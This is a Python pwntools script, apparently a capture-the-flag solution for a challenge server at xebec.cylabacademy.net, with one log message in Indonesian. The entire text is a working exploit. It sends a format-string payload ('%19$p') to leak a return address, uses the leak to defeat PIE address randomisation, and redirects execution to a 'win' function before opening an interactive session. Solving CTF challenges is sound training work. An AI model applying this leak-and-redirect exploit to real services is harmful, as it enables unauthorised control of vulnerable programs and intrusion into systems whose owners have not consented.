from pwn import *

HOST = "xebec.cylabacademy.net"
POST = 47118

context.binary = elf = ELF("./vuln",checksec=False)
context.log_level = "info"

def main():
    io = remote(HOST, POST)
    io.recvuntil(b"Enter your name:")
    io.sendline(b"%19$p")
    leak_line = io.recvline(timeout=5).strip()

    if not leak_line.startswith(b"0x"):
        log.failure(f"Format leak tidak sesuai: {leak_line!r}")
        io.close()
        return

    leaked_return = int(leak_line, 16)
    log.success(f"Leaked return address: {leaked_return:#x}")

    return_offset = elf.sym["main"] + 0x44

    pie_base = leaked_return - return_offset
    win_addr = pie_base + elf.sym["win"]

    log.info(f"PIE base : {pie_base:#x}")
    log.success(f"Win addr : {win_addr:#x}")

    io.sendlineafter(
        b" enter the address to jump to, ex => 0x12345: ",
        hex(win_addr).encode()
    )

    io.interactive()


if __name__ == "__main__":
    main()
